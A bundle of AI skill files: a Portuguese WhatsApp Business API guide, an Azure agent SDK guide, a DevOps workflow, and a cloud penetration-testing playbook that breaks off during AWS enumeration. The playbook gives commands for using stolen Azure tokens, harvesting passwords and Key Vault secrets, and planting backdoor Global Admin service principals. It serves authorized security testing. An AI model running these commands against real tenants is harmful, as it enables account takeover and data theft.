| Authentication | $0.004-$0.0456    | OTP, reset de senha                     |
| Service        | GRATIS            | Resposta dentro da janela de 24h        |

**Pre-requisitos:**
- Conta Meta Business Suite (gratuita)
- App no Meta for Developers com produto WhatsApp
- Numero de telefone verificado
- System User Token (permanente)

Se o usuario nao tem conta Meta Business, leia `references/setup-guide.md` para o guia completo de setup do zero.

---

## Decision Tree

Use esta arvore para determinar o proximo passo:

```
O usuario precisa de setup inicial?
├── SIM → Leia references/setup-guide.md
└── NAO → Qual linguagem?
    ├── Node.js/TypeScript
    └── Python
    → O que quer fazer?
       ├── Enviar mensagens → Secao "Tipos de Mensagem" abaixo
       ├── Receber mensagens → Secao "Webhooks" abaixo
       ├── Automatizar atendimento → Secao "Automacao" abaixo
       ├── WhatsApp Flows / Commerce → Secao "Features Avancados" abaixo
       ├── Gerenciar templates → references/template-management.md
       └── Compliance / limites → Secao "Compliance & Quality" abaixo
```

Para iniciar um projeto do zero com boilerplate pronto, use o script:
```bash
python scripts/setup_project.py --language nodejs --path ./meu-projeto

## Ou

python scripts/setup_project.py --language python --path ./meu-projeto
```

---

## 1. Configurar Variaveis De Ambiente

```env
WHATSAPP_TOKEN=seu_access_token_aqui
PHONE_NUMBER_ID=seu_phone_number_id
WABA_ID=seu_whatsapp_business_account_id
APP_SECRET=seu_app_secret
VERIFY_TOKEN=token_customizado_para_webhook
```

## 2. Enviar Mensagem De Texto Simples

**Node.js/TypeScript:**
```typescript
import axios from 'axios';

const GRAPH_API = 'https://graph.facebook.com/v21.0';

async function sendText(to: string, message: string) {
  const response = await axios.post(
    `${GRAPH_API}/${process.env.PHONE_NUMBER_ID}/messages`,
    {
      messaging_product: 'whatsapp',
      to,
      type: 'text',
      text: { body: message }
    },
    { headers: { Authorization: `Bearer ${process.env.WHATSAPP_TOKEN}` } }
  );
  return response.data; // { messaging_product, contacts, messages: [{ id }] }
}
```

**Python:**
```python
import httpx
import os

GRAPH_API = "https://graph.facebook.com/v21.0"

async def send_text(to: str, message: str) -> dict:
    async with httpx.AsyncClient() as client:
        response = await client.post(
            f"{GRAPH_API}/{os.environ['PHONE_NUMBER_ID']}/messages",
            json={
                "messaging_product": "whatsapp",
                "to": to,
                "type": "text",
                "text": {"body": message}
            },
            headers={"Authorization": f"Bearer {os.environ['WHATSAPP_TOKEN']}"}
        )
        return response.json()  # {"messaging_product", "contacts", "messages": [{"id"}]}
```

## 3. Enviar Template Message (Fora Da Janela De 24H)

Templates sao a unica forma de iniciar conversa com um cliente. Devem ser aprovados pela WhatsApp antes do uso.

```json
{
  "messaging_product": "whatsapp",
  "to": "5511999999999",
  "type": "template",
  "template": {
    "name": "hello_world",
    "language": { "code": "pt_BR" },
    "components": [
      {
        "type": "body",
        "parameters": [
          { "type": "text", "text": "João" }
        ]
      }
    ]
  }
}
```

## 4. Verificar Entrega

Use o script de teste para validar:
```bash
python scripts/send_test_message.py --to 5511999999999 --message "Teste de integracao"
```

---

## Tipos De Mensagem

| Tipo               | Uso                                   | Limite           |
|--------------------|---------------------------------------|------------------|
| Text               | Mensagens simples de texto            | 4096 chars       |
| Template           | Iniciar conversa / fora da janela 24h | 1600 chars body  |
| Image              | Fotos e imagens                       | 5MB              |
| Document           | PDFs, planilhas, docs                 | 100MB            |
| Video              | Videos                                | 16MB             |
| Audio              | Mensagens de voz                      | 16MB             |
| Interactive Button | Botoes de resposta rapida             | Max 3 botoes     |
| Interactive List   | Menu com opcoes em secoes             | Max 10 opcoes    |
| Location           | Compartilhar localizacao              | lat/long         |
| Contact            | Compartilhar contato                  | vCard format     |
| Reaction           | Reagir com emoji a mensagem           | 1 emoji          |

**Exemplo - Botoes interativos (Node.js):**
```typescript
async function sendButtons(to: string, body: string, buttons: Array<{id: string, title: string}>) {
  return axios.post(`${GRAPH_API}/${process.env.PHONE_NUMBER_ID}/messages`, {
    messaging_product: 'whatsapp',
    to,
    type: 'interactive',
    interactive: {
      type: 'button',
      body: { text: body },
      action: {
        buttons: buttons.map(b => ({
          type: 'reply',
          reply: { id: b.id, title: b.title }
        }))
      }
    }
  }, { headers: { Authorization: `Bearer ${process.env.WHATSAPP_TOKEN}` } });
}

// Uso:
await sendButtons('5511999999999', 'Como posso ajudar?', [
  { id: 'suporte', title: 'Suporte' },
  { id: 'vendas', title: 'Vendas' },
  { id: 'info', title: 'Informacoes' }
]);
```

**Para exemplos completos de todos os tipos em Node.js e Python**, leia `references/message-types.md`.

---

## Webhooks

Webhooks permitem receber mensagens e atualizacoes de status em tempo real.

## Verificacao (Get) - Obrigatorio

Quando voce configura o webhook no Meta Developers, a Meta envia um GET para verificar:

```typescript
// Node.js (Express)
app.get('/webhook', (req, res) => {
  const mode = req.query['hub.mode'];
  const token = req.query['hub.verify_token'];
  const challenge = req.query['hub.challenge'];

  if (mode === 'subscribe' && token === process.env.VERIFY_TOKEN) {
    res.status(200).send(challenge);
  } else {
    res.sendStatus(403);
  }
});
```

## Recebimento (Post) - Com Seguranca Hmac-Sha256

Toda notificacao de webhook vem assinada no header `X-Hub-Signature-256`. Valide SEMPRE antes de processar:

```typescript
import crypto from 'crypto';

function validateSignature(rawBody: Buffer, signature: string): boolean {
  const expectedSig = crypto
    .createHmac('sha256', process.env.APP_SECRET!)
    .update(rawBody)
    .digest('hex');
  return crypto.timingSafeEqual(
    Buffer.from(`sha256=${expectedSig}`),
    Buffer.from(signature)
  );
}
```

**Importante:** Usar `crypto.timingSafeEqual` (Node.js) ou `hmac.compare_digest` (Python) para prevenir timing attacks. Nunca use comparacao simples de strings.

## Eventos Recebidos

- **messages** - Mensagem do cliente (texto, midia, botao, localizacao)
- **statuses** - Atualizado de status (sent → delivered → read)
- **errors** - Erros de entrega

**Requisitos:**
- Endpoint HTTPS com certificado SSL valido
- Responder com HTTP 200 em ate 5 segundos
- Dev: use ngrok para teste local

**Para setup completo com exemplos Node.js e Python**, leia `references/webhook-setup.md`.

---

## Menu Principal Interativo

Use botoes ou listas para criar um menu de opcoes na primeira interacao:

```python

## Python - Menu Com Lista Interativa

async def send_main_menu(to: str):
    await send_interactive_list(
        to=to,
        header="Bem-vindo!",
        body="Selecione o que precisa:",
        button_text="Ver opcoes",
        sections=[{
            "title": "Atendimento",
            "rows": [
                {"id": "suporte", "title": "Suporte Tecnico", "description": "Ajuda com problemas"},
                {"id": "vendas", "title": "Vendas", "description": "Conhecer nossos produtos"},
                {"id": "financeiro", "title": "Financeiro", "description": "Boletos e pagamentos"},
            ]
        }]
    )
```

## State Machine Para Fluxos

Gerencie conversas com uma maquina de estados. Cada cliente tem um estado atual que determina como a proxima mensagem sera processada:

```
INICIO → MENU_PRINCIPAL → SUPORTE → AGUARDANDO_DETALHES → ESCALACAO_HUMANO
                        → VENDAS → CATALOGO → CHECKOUT
                        → FINANCEIRO → SEGUNDA_VIA_BOLETO
```

## Janela De 24 Horas

- **Dentro da janela (24h apos ultima mensagem do cliente):** Pode enviar qualquer tipo de mensagem gratuitamente
- **Fora da janela:** Apenas template messages (cobradas por categoria)

## Integracao Com Ia (LLM API)

Combine WhatsApp com AI assistant para respostas inteligentes:
1. Receba mensagem via webhook
2. Envie para LLM API com contexto da conversa
3. Retorne resposta via WhatsApp
4. Mantenha escalacao para humano disponivel

**Para padroes completos de automacao**, leia `references/automation-patterns.md`.

---

## Whatsapp Flows

Formularios interativos multi-tela dentro do WhatsApp. O cliente preenche campos sem sair do app. Definidos em JSON com screens, components e actions.

Use cases: cadastros, agendamentos, pesquisas NPS, selecao de produtos.

## Commerce & Catalogo

Ate 500 produtos no catalogo WhatsApp. Envie mensagens de produto individual ou multi-produto com checkout in-app.

## Template Management Api

Crie, liste e delete templates programaticamente. Ate 6000 traducoes por conta. Aprovacao em minutos.

## Whatsapp Channels

Broadcasting unidirecional para subscribers ilimitados. Localizado na aba "Atualizacoes" do WhatsApp.

## Click-To-Whatsapp Ads

Anuncios no Facebook/Instagram com botao que abre conversa no WhatsApp. 99% de taxa de abertura.

## Status Tracking

Rastreie entrega: pending → server → device → read. Receba via webhook de status updates.

**Para detalhes completos de features avancados**, leia `references/advanced-features.md`.
**Para gerenciamento de templates via API**, leia `references/template-management.md`.

---

## Checklist Essencial

- [ ] Opt-in explicito obtido antes de enviar mensagens
- [ ] Mecanismo de opt-out implementado (keyword "SAIR" ou "STOP")
- [ ] Registro de consentimento com timestamp, metodo e proposito
- [ ] Conteudo dentro das politicas do WhatsApp (sem spam, sem conteudo proibido)
- [ ] LGPD/GDPR compliance (base legal definida, direitos do titular)
- [ ] Frequencia de mensagens adequada (nao excessiva)
- [ ] Templates aprovados antes do uso
- [ ] Verificacao de negocio completa (para limites maiores)

## Quality Rating

O WhatsApp monitora a qualidade das suas mensagens e atribui um rating:

| Rating    | Significado                        | Acao                              |
|-----------|------------------------------------|-----------------------------------|
| Verde     | Boa qualidade, poucos bloqueios    | Manter — elegivel para upgrade    |
| Amarelo   | Qualidade media, atencao necessaria| Revisar conteudo e frequencia     |
| Vermelho  | Qualidade baixa, risco de suspensao| Acao imediata: reduzir volume     |

**Sinais positivos:** Alta taxa de resposta, engajamento, poucos bloqueios
**Sinais negativos:** Bloqueios, reports de spam, baixo engajamento

## Tier System (Limites De Mensagem)

Desde outubro 2025, limites sao por **Business Portfolio** (nao por numero):

| Tier         | Conversas/24h | Como alcancar                           |
|--------------|---------------|------------------------------------------|
| Inicial      | 250           | Conta nova / nao verificada              |
| Tier 1       | 1,000         | Auto-upgrade: 50%+ do limite por 7 dias  |
| Tier 2       | 10,000        | Auto-upgrade: 50%+ do limite por 7 dias  |
| Tier 3       | 100,000       | Auto-upgrade: 50%+ do limite por 7 dias  |
| Unlimited    | Ilimitado     | Auto-upgrade: 50%+ do limite por 7 dias  |

**Mudancas 2026:** Tiers 2K e 10K serao removidos. Apos verificacao de negocio, limite imediato de 100K.

**Para guia completo de compliance**, leia `references/compliance.md`.

---

## Troubleshooting

| Problema                       | Causa Provavel                     | Solucao                                    |
|--------------------------------|------------------------------------|--------------------------------------------|
| 401 Unauthorized               | Token expirado ou invalido         | Gerar novo System User Token               |
| 400 Bad Request                | Payload malformado                 | Verificar JSON contra exemplos             |
| Template rejeitado             | Conteudo viola politicas           | Revisar e resubmeter com alteracoes        |
| Webhook nao recebe             | URL invalida ou sem HTTPS          | Usar ngrok (dev) ou certificado SSL (prod) |
| Rate limit exceeded            | Ultrapassou 80 msg/s              | Implementar queue com retry                |
| Quality rating baixo           | Muitos bloqueios/reports           | Reduzir volume, melhorar conteudo          |
| Mensagem nao entregue          | Numero invalido ou nao no WhatsApp | Validar numero antes de enviar             |
| Numero nao verificado          | OTP nao completado                 | Repetir verificacao via SMS ou ligacao      |

Para validar sua configuracao:
```bash
python scripts/validate_config.py
```

---

## Referencias (Leia Conforme Necessidade)

| Arquivo                        | Quando ler                                        |
|--------------------------------|---------------------------------------------------|
| `references/setup-guide.md`    | Setup inicial — criar conta Meta, configurar API  |
| `references/message-types.md`  | Exemplos completos de todos os tipos de mensagem   |
| `references/webhook-setup.md`  | Configurar webhooks com seguranca HMAC             |
| `references/automation-patterns.md` | Chatbot, filas, state machine, integracao IA  |
| `references/compliance.md`     | LGPD/GDPR, opt-in, quality rating, tier system    |
| `references/api-reference.md`  | Endpoints, erros, rate limits, pricing 2026        |
| `references/advanced-features.md` | Flows, Commerce, Channels, Ads, Status Tracking|
| `references/template-management.md` | CRUD de templates via API                     |

## Scripts

| Script                         | O que faz                                         |
|--------------------------------|---------------------------------------------------|
| `scripts/setup_project.py`     | Cria projeto com boilerplate (Node.js ou Python)   |
| `scripts/validate_config.py`   | Valida credenciais e conexao com a API             |
| `scripts/send_test_message.py` | Envia mensagem teste para validar setup            |

## Boilerplate

| Diretorio                      | Conteudo                                          |
|--------------------------------|---------------------------------------------------|
| `assets/boilerplate/nodejs/`   | Projeto TypeScript/Express completo                |
| `assets/boilerplate/python/`   | Projeto Python/Flask completo                      |
| `assets/examples/`             | Exemplos de payloads JSON (templates, webhooks, flows) |

## Best Practices

- Provide clear, specific context about your project and requirements
- Review all suggestions before applying them to production code
- Combine with other complementary skills for comprehensive analysis

## Common Pitfalls

- Using this skill for tasks outside its domain expertise
- Applying recommendations without understanding your specific context
- Not providing enough project context for accurate analysis

## Related Skills

- `instagram` - Complementary skill for enhanced analysis
- `social-orchestrator` - Complementary skill for enhanced analysis
- `telegram` - Complementary skill for enhanced analysis

## Source: references/skills/cloud-architect/references/legacy/agent-framework-azure-ai-py/SKILL.md

---
name: agent-framework-azure-ai-py
description: "Build Azure AI Foundry agents using the Microsoft Agent Framework Python SDK (agent-framework-azure-ai). Use when creating persistent agents with AzureAIAgentsProvider, using hosted tools (code int..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Agent Framework Azure Hosted Agents

Build persistent agents on Azure AI Foundry using the Microsoft Agent Framework Python SDK.

## Architecture

```
User Query → AzureAIAgentsProvider → Azure AI Agent Service (Persistent)
                    ↓
              Agent.run() / Agent.run_stream()
                    ↓
              Tools: Functions | Hosted (Code/Search/Web) | MCP
                    ↓
              AgentThread (conversation persistence)
```

## Installation

```bash
# Full framework (recommended)
pip install agent-framework --pre

# Or Azure-specific package only
pip install agent-framework-azure-ai --pre
```

## Environment Variables

```bash
export AZURE_AI_PROJECT_ENDPOINT="https://<project>.services.ai.azure.com/api/projects/<project-id>"
export AZURE_AI_MODEL_DEPLOYMENT_NAME="gpt-4o-mini"
export BING_CONNECTION_ID="your-bing-connection-id"  # For web search
```

## Authentication

```python
from azure.identity.aio import AzureCliCredential, DefaultAzureCredential

# Development
credential = AzureCliCredential()

# Production
credential = DefaultAzureCredential()
```

## Core Workflow

### Basic Agent

```python
import asyncio
from agent_framework.azure import AzureAIAgentsProvider
from azure.identity.aio import AzureCliCredential

async def main():
    async with (
        AzureCliCredential() as credential,
        AzureAIAgentsProvider(credential=credential) as provider,
    ):
        agent = await provider.create_agent(
            name="MyAgent",
            instructions="You are a helpful assistant.",
        )
        
        result = await agent.run("Hello!")
        print(result.text)

asyncio.run(main())
```

### Agent with Function Tools

```python
from typing import Annotated
from pydantic import Field
from agent_framework.azure import AzureAIAgentsProvider
from azure.identity.aio import AzureCliCredential

def get_weather(
    location: Annotated[str, Field(description="City name to get weather for")],
) -> str:
    """Get the current weather for a location."""
    return f"Weather in {location}: 72°F, sunny"

def get_current_time() -> str:
    """Get the current UTC time."""
    from datetime import datetime, timezone
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

async def main():
    async with (
        AzureCliCredential() as credential,
        AzureAIAgentsProvider(credential=credential) as provider,
    ):
        agent = await provider.create_agent(
            name="WeatherAgent",
            instructions="You help with weather and time queries.",
            tools=[get_weather, get_current_time],  # Pass functions directly
        )
        
        result = await agent.run("What's the weather in Seattle?")
        print(result.text)
```

### Agent with Hosted Tools

```python
from agent_framework import (
    HostedCodeInterpreterTool,
    HostedFileSearchTool,
    HostedWebSearchTool,
)
from agent_framework.azure import AzureAIAgentsProvider
from azure.identity.aio import AzureCliCredential

async def main():
    async with (
        AzureCliCredential() as credential,
        AzureAIAgentsProvider(credential=credential) as provider,
    ):
        agent = await provider.create_agent(
            name="MultiToolAgent",
            instructions="You can execute code, search files, and search the web.",
            tools=[
                HostedCodeInterpreterTool(),
                HostedWebSearchTool(name="Bing"),
            ],
        )
        
        result = await agent.run("Calculate the factorial of 20 in Python")
        print(result.text)
```

### Streaming Responses

```python
async def main():
    async with (
        AzureCliCredential() as credential,
        AzureAIAgentsProvider(credential=credential) as provider,
    ):
        agent = await provider.create_agent(
            name="StreamingAgent",
            instructions="You are a helpful assistant.",
        )
        
        print("Agent: ", end="", flush=True)
        async for chunk in agent.run_stream("Tell me a short story"):
            if chunk.text:
                print(chunk.text, end="", flush=True)
        print()
```

### Conversation Threads

```python
from agent_framework.azure import AzureAIAgentsProvider
from azure.identity.aio import AzureCliCredential

async def main():
    async with (
        AzureCliCredential() as credential,
        AzureAIAgentsProvider(credential=credential) as provider,
    ):
        agent = await provider.create_agent(
            name="ChatAgent",
            instructions="You are a helpful assistant.",
            tools=[get_weather],
        )
        
        # Create thread for conversation persistence
        thread = agent.get_new_thread()
        
        # First turn
        result1 = await agent.run("What's the weather in Seattle?", thread=thread)
        print(f"Agent: {result1.text}")
        
        # Second turn - context is maintained
        result2 = await agent.run("What about Portland?", thread=thread)
        print(f"Agent: {result2.text}")
        
        # Save thread ID for later resumption
        print(f"Conversation ID: {thread.conversation_id}")
```

### Structured Outputs

```python
from pydantic import BaseModel, ConfigDict
from agent_framework.azure import AzureAIAgentsProvider
from azure.identity.aio import AzureCliCredential

class WeatherResponse(BaseModel):
    model_config = ConfigDict(extra="forbid")
    
    location: str
    temperature: float
    unit: str
    conditions: str

async def main():
    async with (
        AzureCliCredential() as credential,
        AzureAIAgentsProvider(credential=credential) as provider,
    ):
        agent = await provider.create_agent(
            name="StructuredAgent",
            instructions="Provide weather information in structured format.",
            response_format=WeatherResponse,
        )
        
        result = await agent.run("Weather in Seattle?")
        weather = WeatherResponse.model_validate_json(result.text)
        print(f"{weather.location}: {weather.temperature}°{weather.unit}")
```

## Provider Methods

| Method | Description |
|--------|-------------|
| `create_agent()` | Create new agent on Azure AI service |
| `get_agent(agent_id)` | Retrieve existing agent by ID |
| `as_agent(sdk_agent)` | Wrap SDK Agent object (no HTTP call) |

## Hosted Tools Quick Reference

| Tool | Import | Purpose |
|------|--------|---------|
| `HostedCodeInterpreterTool` | `from agent_framework import HostedCodeInterpreterTool` | Execute Python code |
| `HostedFileSearchTool` | `from agent_framework import HostedFileSearchTool` | Search vector stores |
| `HostedWebSearchTool` | `from agent_framework import HostedWebSearchTool` | Bing web search |
| `HostedMCPTool` | `from agent_framework import HostedMCPTool` | Service-managed MCP |
| `MCPStreamableHTTPTool` | `from agent_framework import MCPStreamableHTTPTool` | Client-managed MCP |

## Complete Example

```python
import asyncio
from typing import Annotated
from pydantic import BaseModel, Field
from agent_framework import (
    HostedCodeInterpreterTool,
    HostedWebSearchTool,
    MCPStreamableHTTPTool,
)
from agent_framework.azure import AzureAIAgentsProvider
from azure.identity.aio import AzureCliCredential


def get_weather(
    location: Annotated[str, Field(description="City name")],
) -> str:
    """Get weather for a location."""
    return f"Weather in {location}: 72°F, sunny"


class AnalysisResult(BaseModel):
    summary: str
    key_findings: list[str]
    confidence: float


async def main():
    async with (
        AzureCliCredential() as credential,
        MCPStreamableHTTPTool(
            name="Docs MCP",
            url="https://learn.microsoft.com/api/mcp",
        ) as mcp_tool,
        AzureAIAgentsProvider(credential=credential) as provider,
    ):
        agent = await provider.create_agent(
            name="ResearchAssistant",
            instructions="You are a research assistant with multiple capabilities.",
            tools=[
                get_weather,
                HostedCodeInterpreterTool(),
                HostedWebSearchTool(name="Bing"),
                mcp_tool,
            ],
        )
        
        thread = agent.get_new_thread()
        
        # Non-streaming
        result = await agent.run(
            "Search for Python best practices and summarize",
            thread=thread,
        )
        print(f"Response: {result.text}")
        
        # Streaming
        print("\nStreaming: ", end="")
        async for chunk in agent.run_stream("Continue with examples", thread=thread):
            if chunk.text:
                print(chunk.text, end="", flush=True)
        print()
        
        # Structured output
        result = await agent.run(
            "Analyze findings",
            thread=thread,
            response_format=AnalysisResult,
        )
        analysis = AnalysisResult.model_validate_json(result.text)
        print(f"\nConfidence: {analysis.confidence}")


if __name__ == "__main__":
    asyncio.run(main())
```

## Conventions

- Always use async context managers: `async with provider:`
- Pass functions directly to `tools=` parameter (auto-converted to AIFunction)
- Use `Annotated[type, Field(description=...)]` for function parameters
- Use `get_new_thread()` for multi-turn conversations
- Prefer `HostedMCPTool` for service-managed MCP, `MCPStreamableHTTPTool` for client-managed

## Reference Files

- references/tools.md: Detailed hosted tool patterns
- references/mcp.md: MCP integration (hosted + local)
- references/threads.md: Thread and conversation management
- references/advanced.md: OpenAPI, citations, structured outputs

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.

## Source: references/skills/cloud-architect/references/legacy/cloud-devops/SKILL.md

---
name: cloud-devops
description: "Cloud infrastructure and DevOps workflow covering AWS, Azure, GCP, Kubernetes, Terraform, CI/CD, monitoring, and cloud-native development."
category: workflow-bundle
risk: safe
source: personal
date_added: "2026-02-27"
---

# Cloud/DevOps Workflow Bundle

## Overview

Comprehensive cloud and DevOps workflow for infrastructure provisioning, container orchestration, CI/CD pipelines, monitoring, and cloud-native application development.

## When to Use This Workflow

Use this workflow when:
- Setting up cloud infrastructure
- Implementing CI/CD pipelines
- Deploying Kubernetes applications
- Configuring monitoring and observability
- Managing cloud costs
- Implementing DevOps practices

## Workflow Phases

### Phase 1: Cloud Infrastructure Setup

#### Skills to Invoke
- `cloud-architect` - Cloud architecture
- `aws-skills` - AWS development
- `azure-functions` - Azure development
- `gcp-cloud-run` - GCP development
- `terraform-skill` - Terraform IaC
- `terraform-specialist` - Advanced Terraform

#### Actions
1. Design cloud architecture
2. Set up accounts and billing
3. Configure networking
4. Provision resources
5. Set up IAM

#### Copy-Paste Prompts
```
Use @cloud-architect to design multi-cloud architecture
```

```
Use @terraform-skill to provision AWS infrastructure
```

### Phase 2: Container Orchestration

#### Skills to Invoke
- `kubernetes-architect` - Kubernetes architecture
- `docker-expert` - Docker containerization
- `helm-chart-scaffolding` - Helm charts
- `k8s-manifest-generator` - K8s manifests
- `k8s-security-policies` - K8s security

#### Actions
1. Design container architecture
2. Create Dockerfiles
3. Build container images
4. Write K8s manifests
5. Deploy to cluster
6. Configure networking

#### Copy-Paste Prompts
```
Use @kubernetes-architect to design K8s architecture
```

```
Use @docker-expert to containerize application
```

```
Use @helm-chart-scaffolding to create Helm chart
```

### Phase 3: CI/CD Implementation

#### Skills to Invoke
- `deployment-engineer` - Deployment engineering
- `cicd-automation-workflow-automate` - CI/CD automation
- `github-actions-templates` - GitHub Actions
- `gitlab-ci-patterns` - GitLab CI
- `deployment-pipeline-design` - Pipeline design

#### Actions
1. Design deployment pipeline
2. Configure build automation
3. Set up test automation
4. Configure deployment stages
5. Implement rollback strategies
6. Set up notifications

#### Copy-Paste Prompts
```
Use @cicd-automation-workflow-automate to set up CI/CD pipeline
```

```
Use @github-actions-templates to create GitHub Actions workflow
```

### Phase 4: Monitoring and Observability

#### Skills to Invoke
- `observability-engineer` - Observability engineering
- `grafana-dashboards` - Grafana dashboards
- `prometheus-configuration` - Prometheus setup
- `datadog-automation` - Datadog integration
- `sentry-automation` - Sentry error tracking

#### Actions
1. Design monitoring strategy
2. Set up metrics collection
3. Configure log aggregation
4. Implement distributed tracing
5. Create dashboards
6. Set up alerts

#### Copy-Paste Prompts
```
Use @observability-engineer to set up observability stack
```

```
Use @grafana-dashboards to create monitoring dashboards
```

### Phase 5: Cloud Security

#### Skills to Invoke
- `cloud-penetration-testing` - Cloud pentesting
- `aws-penetration-testing` - AWS security
- `k8s-security-policies` - K8s security
- `secrets-management` - Secrets management
- `mtls-configuration` - mTLS setup

#### Actions
1. Assess cloud security
2. Configure security groups
3. Set up secrets management
4. Implement network policies
5. Configure encryption
6. Set up audit logging

#### Copy-Paste Prompts
```
Use @cloud-penetration-testing to assess cloud security
```

```
Use @secrets-management to configure secrets
```

### Phase 6: Cost Optimization

#### Skills to Invoke
- `cost-optimization` - Cloud cost optimization
- `database-cloud-optimization-cost-optimize` - Database cost optimization

#### Actions
1. Analyze cloud spending
2. Identify optimization opportunities
3. Right-size resources
4. Implement auto-scaling
5. Use reserved instances
6. Set up cost alerts

#### Copy-Paste Prompts
```
Use @cost-optimization to reduce cloud costs
```

### Phase 7: Disaster Recovery

#### Skills to Invoke
- `incident-responder` - Incident response
- `incident-runbook-templates` - Runbook creation
- `postmortem-writing` - Postmortem documentation

#### Actions
1. Design DR strategy
2. Set up backups
3. Create runbooks
4. Test failover
5. Document procedures
6. Train team

#### Copy-Paste Prompts
```
Use @incident-runbook-templates to create runbooks
```

## Cloud Provider Workflows

### AWS
```
Skills: aws-skills, aws-serverless, aws-penetration-testing
Services: EC2, Lambda, S3, RDS, ECS, EKS
```

### Azure
```
Skills: azure-functions, azure-ai-projects-py, azure-monitor-opentelemetry-py
Services: Functions, App Service, AKS, Cosmos DB
```

### GCP
```
Skills: gcp-cloud-run
Services: Cloud Run, GKE, Cloud Functions, BigQuery
```

## Quality Gates

- [ ] Infrastructure provisioned
- [ ] CI/CD pipeline working
- [ ] Monitoring configured
- [ ] Security measures in place
- [ ] Cost optimization applied
- [ ] DR procedures documented

## Related Workflow Bundles

- `development` - Application development
- `security-audit` - Security testing
- `database` - Database operations
- `testing-qa` - Testing workflows

## Source: references/skills/cloud-architect/references/legacy/cloud-penetration-testing/SKILL.md

---
name: cloud-penetration-testing
description: "This skill should be used when the user asks to \"perform cloud penetration testing\", \"assess Azure or AWS or GCP security\", \"enumerate cloud resources\", \"exploit cloud misconfiguratio..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Cloud Penetration Testing

## Purpose

Conduct comprehensive security assessments of cloud infrastructure across Microsoft Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP). This skill covers reconnaissance, authentication testing, resource enumeration, privilege escalation, data extraction, and persistence techniques for authorized cloud security engagements.

## Prerequisites

### Required Tools
```bash
# Azure tools
Install-Module -Name Az -AllowClobber -Force
Install-Module -Name MSOnline -Force
Install-Module -Name AzureAD -Force

# AWS CLI
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip && sudo ./aws/install

# GCP CLI
curl https://sdk.cloud.google.com | bash
gcloud init

# Additional tools
pip install scoutsuite pacu
```

### Required Knowledge
- Cloud architecture fundamentals
- Identity and Access Management (IAM)
- API authentication mechanisms
- DevOps and automation concepts

### Required Access
- Written authorization for testing
- Test credentials or access tokens
- Defined scope and rules of engagement

## Outputs and Deliverables

1. **Cloud Security Assessment Report** - Comprehensive findings and risk ratings
2. **Resource Inventory** - Enumerated services, storage, and compute instances
3. **Credential Findings** - Exposed secrets, keys, and misconfigurations
4. **Remediation Recommendations** - Hardening guidance per platform

## Core Workflow

### Phase 1: Reconnaissance

Gather initial information about target cloud presence:

```bash
# Azure: Get federation info
curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"

# Azure: Get Tenant ID
curl "https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration"

# Enumerate cloud resources by company name
python3 cloud_enum.py -k targetcompany

# Check IP against cloud providers
cat ips.txt | python3 ip2provider.py
```

### Phase 2: Azure Authentication

Authenticate to Azure environments:

```powershell
# Az PowerShell Module
Import-Module Az
Connect-AzAccount

# With credentials (may bypass MFA)
$credential = Get-Credential
Connect-AzAccount -Credential $credential

# Import stolen context
Import-AzContext -Profile 'C:\Temp\StolenToken.json'

# Export context for persistence
Save-AzContext -Path C:\Temp\AzureAccessToken.json

# MSOnline Module
Import-Module MSOnline
Connect-MsolService
```

### Phase 3: Azure Enumeration

Discover Azure resources and permissions:

```powershell
# List contexts and subscriptions
Get-AzContext -ListAvailable
Get-AzSubscription

# Current user role assignments
Get-AzRoleAssignment

# List resources
Get-AzResource
Get-AzResourceGroup

# Storage accounts
Get-AzStorageAccount

# Web applications
Get-AzWebApp

# SQL Servers and databases
Get-AzSQLServer
Get-AzSqlDatabase -ServerName $Server -ResourceGroupName $RG

# Virtual machines
Get-AzVM
$vm = Get-AzVM -Name "VMName"
$vm.OSProfile

# List all users
Get-MSolUser -All

# List all groups
Get-MSolGroup -All

# Global Admins
Get-MsolRole -RoleName "Company Administrator"
Get-MSolGroupMember -GroupObjectId $GUID

# Service Principals
Get-MsolServicePrincipal
```

### Phase 4: Azure Exploitation

Exploit Azure misconfigurations:

```powershell
# Search user attributes for passwords
$users = Get-MsolUser -All
foreach($user in $users){
    $props = @()
    $user | Get-Member | foreach-object{$props+=$_.Name}
    foreach($prop in $props){
        if($user.$prop -like "*password*"){
            Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)
        }
    }
}

# Execute commands on VMs
Invoke-AzVMRunCommand -ResourceGroupName $RG -VMName $VM -CommandId RunPowerShellScript -ScriptPath ./script.ps1

# Extract VM UserData
$vms = Get-AzVM
$vms.UserData

# Dump Key Vault secrets
az keyvault list --query '[].name' --output tsv
az keyvault set-policy --name <vault> --upn <user> --secret-permissions get list
az keyvault secret list --vault-name <vault> --query '[].id' --output tsv
az keyvault secret show --id <URI>
```

### Phase 5: Azure Persistence

Establish persistence in Azure:

```powershell
# Create backdoor service principal
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)

# Add service principal to Global Admin
$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
$role = Get-MsolRole -RoleName "Company Administrator"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId

# Login as service principal
$cred = Get-Credential  # AppID as username, secret as password
Connect-AzAccount -Credential $cred -Tenant "tenant-id" -ServicePrincipal

# Create new admin user via CLI
az ad user create --display-name <name> --password <pass> --user-principal-name <upn>
```

### Phase 6: AWS Authentication

Authenticate to AWS environments:

```bash
# Configure AWS CLI
aws configure
# Enter: Access Key ID, Secret Access Key, Region, Output format

# Use specific profile
aws configure --profile target

# Test credentials
aws sts get-caller-identity
```

### Phase 7: AWS Enumeration

Discover AWS resources:

```bash
# Account information
aws sts get-caller-identity
aws iam list-users
aws iam list-roles

# S3 Buckets
aws s3 ls
aws s3 ls s3://bucket-name/
aws s3 sync s3://bucket-name ./local-dir

# EC2 Instances
aws ec2 describe-instances

# RDS Databases
aws rds describe-db-instances --region us-east-1

